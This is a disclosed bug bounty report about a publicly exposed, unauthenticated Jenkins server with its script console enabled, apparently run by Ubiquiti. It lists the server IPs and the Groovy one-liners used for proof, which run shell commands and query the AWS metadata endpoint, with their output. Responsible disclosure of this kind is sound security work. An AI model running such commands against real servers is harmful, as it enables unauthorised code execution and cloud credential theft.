---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/code-injection
  - env/web
  - stack/java
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2018-09-10
submitted: 2018-08-31T12:05:04.584Z
bounty_usd: null
votes: 74
cve: []
program: "[[programs/ui|Ubiquiti Inc.]]"
reporter: "smiegles"
source: "https://hackerone.com/reports/403402"
title: "Public Jenkins instance with /script enabled"
---
# Public Jenkins instance with /script enabled

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 74 | **Program:** Ubiquiti Inc. | **Disclosed:** 2018-09-10

- Report: [https://hackerone.com/reports/403402](https://hackerone.com/reports/403402)
- CWE: Code Injection
- Submitted: 2018-08-31T12:05:04.584Z

## Report summary

Ubiquiti exposed a Jenkins server on the internet without any authentication, this allowed me to reach the AWS metadata service and execute code on the server itself. They resolved the issue and rewarded a bounty within 30 minutes of reporting, really impressive.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi,

First of all. I'm not 100% able to verify that this server is actually owned by Ubnt as there are multiple DNS Name's in the SSL certificate.

```
DNS Name: *.uum.com
DNS Name: *.ubnt.com
DNS Name: *.svc.ubnt.com
DNS Name: *.api.uum.com
DNS Name: *.svc.uum.com
DNS Name: uum.com
```

So, the server hosted on https://54.191.232.223/and https://54.186.253.37/is reachable from the internet and has the scirpt console enabled.

You can execute code on it by going to: https://54.186.253.37/script and insert the following code:

```
"ls /".execute().text
```

__result__
````
Result: bin
boot
dev
docker-java-home
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

It also allows reaching the AWS metadata server:

```
"curl http://169.254.169.254/latest/meta-data/".execute().text
```

__Result__

```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
hostname
iam/
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
```

## Impact

RCE

{F340446}
{F340447}

## Timeline

- **Report Filed**
- **Report Triaged**
- **Bounty Awarded**
- **Report Resolved**
- **2018-08-31** @smiegles: Thank you for the ridiculous fast response and bounty!
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
